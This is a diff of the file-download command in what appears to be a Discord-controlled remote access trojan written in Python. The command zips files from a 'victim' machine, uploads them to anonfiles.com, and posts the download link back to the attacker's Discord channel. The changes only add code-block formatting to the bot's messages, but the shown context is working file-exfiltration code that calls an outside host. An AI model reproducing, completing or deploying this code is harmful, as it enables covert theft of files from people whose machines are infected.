@@ -28,17 +28,17 @@ elif message.content[:9] == '.download':
                             except Exception as e:
                                 message.channel.send(e)
                                 pass
-                    await message.channel.send('Uploading to anonfiles.. this can take a while depending on the file size, amount and the victim\'s internet speed..')
+                    await message.channel.send('```Uploading to anonfiles.. this can take a while depending on the file size, amount and the victim\'s internet speed..```')
                     files = {
                         'file': (f'{message.content[10:]}.zip', open(f'{target_file}', 'rb')),
                     }
                     url = 'https://api.anonfiles.com/upload'
                     response = requests.post(url, files=files)
                     data = response.json()
-                    await message.channel.send(f"{message.content[10:]}.zip: {data['data']['file']['url']['short']}")
+                    await message.channel.send(f"```{message.content[10:]}.zip:``` {data['data']['file']['url']['short']}")
 
                 else:
-                    await message.channel.send('Uploading to anonfiles.. this can take a while depending on the file size and the victim\'s internet speed..')
+                    await message.channel.send('```Uploading to anonfiles.. this can take a while depending on the file size and the victim\'s internet speed..```')
                     files = {
                         'file': (f'{message.content[10:]}', open(f'{target_file}', 'rb')),
                     }
@@ -48,8 +48,8 @@ elif message.content[:9] == '.download':
 
                     data = response.json()
 
-                    await message.channel.send(f"{message.content[10:]}: {data['data']['file']['url']['short']}")
+                    await message.channel.send(f"```{message.content[10:]}:``` {data['data']['file']['url']['short']}")
             else:
                 reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
     else:
-        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+        reaction_msg = await message.channel.send('_ _\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
